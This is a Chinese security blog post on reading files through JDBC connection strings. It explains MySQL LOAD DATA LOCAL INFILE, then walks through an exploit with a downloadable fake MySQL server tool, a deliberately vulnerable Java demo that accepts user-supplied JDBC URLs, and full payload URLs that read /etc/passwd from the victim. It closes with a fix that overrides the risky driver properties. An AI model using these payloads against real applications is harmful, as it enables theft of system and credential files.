#  JDBC漏洞利用之文件读取   
sule01u  黑伞安全   2024-02-18 10:45  
  
# JDBC漏洞利用之文件读取  
## 前序  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlWuibeV8HFQCmteTib84MgLiaV3W2R2OO3JrW3jTZ7AyiaueY5ckib1U7t3FuN3XnWpbnqv93erSqDftIQ/640?wx_fmt=png&from=appmsg "null")  
  
开局放上一张云舒的**一条老微博**截图，if 你还不知道这个图中文字啥意思，then 就跟作者一起来一探究竟吧  
## What is JDBC  
> JDBC的全称是Java数据库连接(Java Database connect)，它是一套用于执行SQL语句的Java API。应用程序可通过这套API连接到关系数据库，并使用SQL语句来完成对数据库中数据的查询、更新和删除等操作。  
  
  
应用程序使用JDBC访问数据库的方式如下图所示:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlWuibeV8HFQCmteTib84MgLiaVGVYXE5X35zrlB5VMr9pJF3dstsaXNL1nZmChK5vOZ6piaPQxfGaKRtQ/640?wx_fmt=png&from=appmsg "null")  
### JDBC的核心组件  
- • **JDBC驱动程序**：数据库厂商提供JDBC驱动程序，这些驱动程序是特定于数据库的实现，用于与数据库进行通信。它们遵循JDBC标准，并实现了Java应用程序与数据库交互所需的所有功能。  
  
- • **JDBC API**：它定义了与数据库交互时使用的类和接口。主要的接口包括Connection、Statement、PreparedStatement、ResultSet等。  
  
- • **JDBC Driver Manager**：这是JDBC的一部分，用于管理不同类型的数据库驱动程序。它在运行时动态地加载驱动程序，并建立与数据库的连接。  
  
- • **SQL语句**：通过JDBC，可以执行标准的SQL语句来查询和更新数据库。  
  
### JDBC的应用场景  
> 开发者为啥用jdbc？这个问题看起来跟本篇文章要去探讨的漏洞原理没啥关系，但是我觉得对于安全人员来说，了解jdbc常见的应用场景有利于提高对于对这个漏洞的感知敏感度  
  
- • **Web应用程序数据库交互**：在基于Java的Web应用程序（如使用Servlets和JSP）中，JDBC常用于实现应用程序与数据库之间的交互，例如用户数据的存取、订单处理、内容管理等。  
  
- • **企业级应用**：在Java EE（Enterprise Edition）环境中，JDBC通常用于实现企业级应用的数据持久化，例如在ERP（企业资源规划）、CRM（客户关系管理）系统中处理大量的交易和数据。  
  
- • **桌面应用程序**：在基于Java的桌面应用程序中，JDBC可用于本地数据库的读写操作，例如在财务软件、个人信息管理工具或其他需要本地数据存储的应用中。  
  
- • **数据集成**：JDBC用于数据集成任务，如ETL（Extract, Transform, Load）过程中的数据提取，或在数据仓库和商业智能系统中集成来自不同数据源的数据。  
  
- • **报表和分析**：在数据分析和报告应用中，JDBC用于从数据库检索数据，并将其转换为可用于分析和报告的格式。  
  
- • **测试和开发工具**：开发和测试工具中，JDBC用于创建、管理和维护数据库，例如在自动化测试脚本中进行数据验证和设置测试数据。  
  
- • **迁移和转换应用**：在数据迁移和转换项目中，JDBC被用于从旧系统读取数据，并将其迁移到新的数据库结构中。  
  
- • **云应用程序**：在云环境中，JDBC用于与云数据库服务（如Amazon RDS, Google Cloud SQL）进行交互，以便在云中运行的应用程序可以有效地访问和处理数据。  
  
- • **物联网（IoT）应用程序**：在IoT（物联网）应用中，JDBC可能用于存储和分析从各种设备和传感器收集的数据。  
  
- • **微服务架构**：在基于微服务的架构中，JDBC可以在单独的服务中用于管理服务特定的数据存储需求。  
  
## 文件读取原理  
> JDBC 本身并不提供直接读取本地文件的功能。不过，通过 JDBC 执行 SQL 语句时，如果数据库本身（如 MySQL）支持通过 SQL 命令读取本地文件，那么就可以间接地实现通过jdbc读取文件这一功能。  
> 一个常见的例子是使用 MySQL 的 LOAD DATA INFILE 语句。  
  
  
插嘴问：喂，为啥看到的文章几乎清一色用mysql举例，别的数据库无法读取文件吗？  
  
插嘴答：第一，我不叫喂，搞错了。。。。。。重来，首先  
- • MySQL 使用广泛  
  
- • MySQL 提供了一种明确且容易理解的方式来演示这种操作，即通过 LOAD DATA INFILE 语句，方便学习  
  
- • 其他数据库系统（如 PostgreSQL, Oracle, SQL Server 等）也有自己的方式来处理外部数据和文件操作。例如，Oracle 有 EXTERNAL TABLES 功能，可以用来访问存储在文件系统中的数据。  
  
### MySQL读取文件演示  
#### LOAD DATA INFILE  
  
LOAD DATA INFILE 用于**从服务器上的文件系统中读取文件**，并将数据导入到数据库表中。这要求文件必须位于数据库服务器上，并且MySQL服务器进程必须有权限读取该文件。  
  
**基本语法：**  
```
LOAD DATA INFILE 'file_path' INTO TABLE table_name;
```  
- • file_path：服务器上文件的路径。  
  
- • table_name：目标表的名称。  
  
**示例:**  
```
LOAD DATA INFILE '/path/to/data.txt' INTO TABLE my_table;
```  
#### LOAD DATA LOCAL INFILE  
  
LOAD DATA LOCAL INFILE 类似于 LOAD DATA INFILE，但它用于**从客户端（即连接到数据库的机器）的文件系统中读取文件**。  
  
**基本语法：**  
```
LOAD DATA LOCAL INFILE 'file_path' INTO TABLE table_name;
```  
  
**示例：**  
> 如果应用程序允许用户控制这个命令中的文件路径，那么攻击者就有机会让读取 提供服务的 主机上的 任意文件（取决于MySQL服务的权限和操作系统的限制）。  
> 下面sql语句要想成功读取文件内容，mysql-client有一个重要的参数  
> • 启用/禁用本地文件加载：通过设置 --local-infile=1 或 --local-infile=0，可以在MySQL服务器或客户端启用或禁用 LOAD DATA LOCAL INFILE 命令。启用时 (1)，允许使用该命令从客户端文件系统读取文件；禁用时 (0)，则阻止这种操作。  
  
- • 连接数据库  
  
```
 mysql --local-infile=1 -h my_ip -u root -p password
```  
- • mysql client读取本地文件并传输到mysql server的表中,  
>>   
  
  
```
 LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE test.my_table;    //读取本地文件到服务器数据库的表中
```  
  
成功读取到文件内容：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlWuibeV8HFQCmteTib84MgLiaVKoAxklAXIFvHR5zbT5yzA3qUhKPsCKSEFu7y2neIVAcl97bGaIY6gQ/640?wx_fmt=png&from=appmsg "null")  
#### ALLOW LOAD LOCAL INFILE  
> 在jdbc-mysql-connector sdk中，控制client是否可以load local file的就是这个参数，在5.x和8.x中默认都是false），所以需要在jdbc url中配置allowLoadLocalInfile=true  
  
## 漏洞利用演示  
### 前置条件  
> 通过前面的了解，我们大概知道，一次有可能成功的jdbc文件读取漏洞的利用，起码要满足几个基本条件，如下所示：  
  
- • **可控的JDBC连接字符串**：攻击者需要能够控制或修改JDBC连接字符串，且应用程序未正确清理或限制用户输入。  
  
- • **服务器的文件系统访问**：服务端可以要求客户端读取有可读权限的任何文件。  
  
### 利用步骤  
> 伪造一个mysql服务器(监听3306端口)，这个伪造的mysql服务器可以不实现mysql任何功能（除了向客户端回复 greeting package外），当有其他客户端连接上该服务器时，直接发送读取该客户端上的指定文件的指令（前提是客户端具有该文件读写权限）  
  
  
**准备假mysql服务器**  
  
jdbc漏洞利用工具下载地址：https://github.com/4ra1n/mysql-fake-server/releases/download/0.0.4/fake-mysql-cli-0.0.4.jar  
  
启动假的mysql服务器：java -jar fake-mysql-cli-0.0.4.jar -p 3306  
  
**假使现在有一个jdbc服务如下所示：**  
```
// JDBCExploitDemo.java
import java.sql.Connection;
import java.sql.DriverManager;
import java.util.Scanner;

public class JDBCExploitDemo {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println("Enter JDBC URL: ");
        String jdbcUrl = scanner.nextLine(); // 用户输入的JDBC URL

        try (Connection conn = DriverManager.getConnection(jdbcUrl)) {
            System.out.println("Connected to the database successfully.");
        } catch (Exception e) {
            System.out.println("Connection failed.");
            e.printStackTrace();
        }
    }
}
```  
  
下载JDBC的mysql对应版本的驱动 : https://downloads.mysql.com/archives/c-j/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlWuibeV8HFQCmteTib84MgLiaVHSlSBuV9TZxmUaasRxfAHjXQsBSsqjaqJAyyRKF3xaTicnrR9wLonJw/640?wx_fmt=png&from=appmsg "null")  
```
# 编译并运行程序,指定驱动路径
javac JDBCExploitDemo.java
java -cp .:mysql-connector-j-8.1.0.jar JDBCExploitDemo
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlWuibeV8HFQCmteTib84MgLiaV1eysnlxj7icZGFnpT10lHXqYEbem9knqkVV5bS0sgHOWViblRgGoOcMA/640?wx_fmt=png&from=appmsg "null")  
```
# 输入程序要求的jdbc url地址
jdbc:mysql://ip:port/test?user=fileread_/etc/passwd&allowLoadLocalInfile=true
```  
  
**其他连接参数**  
```
文件读取的参数
allowLoadLocalInfileInPath=/ 设置读的目录为根目录，这样所有的目录文件都可以读取
allowLoadLocalInfile=true 
allowUrlInLocalInfile=true 这两个参数类似

设置包大小参数
maxAllowedPacket=655360

完整payload可以为：
jdbc:mysql://ip:port/test?user=fileread_/etc/passwd&allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360
```  
  
**查看假mysql服务器是否读取到文件**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlWuibeV8HFQCmteTib84MgLiaVbaKJ5ryu5mmt5HTf24OiawXw6SFwuKoxu9TicZFpOCuiaYHAyPGvNzHaw/640?wx_fmt=png&from=appmsg "null")  
  
读取成功的文件会存在fake_mysql工具的同一路径下的fake-server-files目录中, 进去找到最新的时间戳目录, 进入查看文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlWuibeV8HFQCmteTib84MgLiaVcMEzbTZBwfaJQY473tvUfA3MGqfjxUNvw0ITIzLU63QeqDmxu9l2fg/640?wx_fmt=png&from=appmsg "null")  
  
**成功读取文件；实战中大家肯定会遇到一些有限制的情况，大家可以自行再学习一些绕过的方式**  
  
**TIPS**:  
  
当然，实战中输入url的地方一般都长这样  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlWuibeV8HFQCmteTib84MgLiaVhny5icCZ2glz57KyXnCnmJIkpDze31HozicGaUcP2aiaZNnOrUOD21Fvg/640?wx_fmt=png&from=appmsg "null")  
## 修复方案  
  
原生的场景下可以使用预先定义的Properties将URL中的属性覆盖掉，就可以关闭本地文件读取以及URL读取了。  
  
**修复示例：**  
```
String driver = "com.mysql.jdbc.Driver";
String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?user=test&maxAllowedPacket=655360&allowLoadLocalInfile=true";
Class.forName(driver);
Properties properties = new Properties();
properties.setProperty("allowLoadLocalInfile","false");
properties.setProperty("allowUrlInLocalInfile","false");
properties.setProperty("allowLoadLocalInfileInPath","");
Connection conn = DriverManager.getConnection(DB_URL,properties);
```  
  
  
**祝大家新年快乐，龙年嘎嘎挖洞**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/apmYTPAKhlWuibeV8HFQCmteTib84MgLiaVPmM3jIjQ3218UMUEkSVJmjhZkLsXLrK7Tib3BCy3XVoytdiaQlJKge1w/640?wx_fmt=gif&from=appmsg "")  
  
    
  
   
**欢迎关注不懂安全⬇️**  
  
  
  
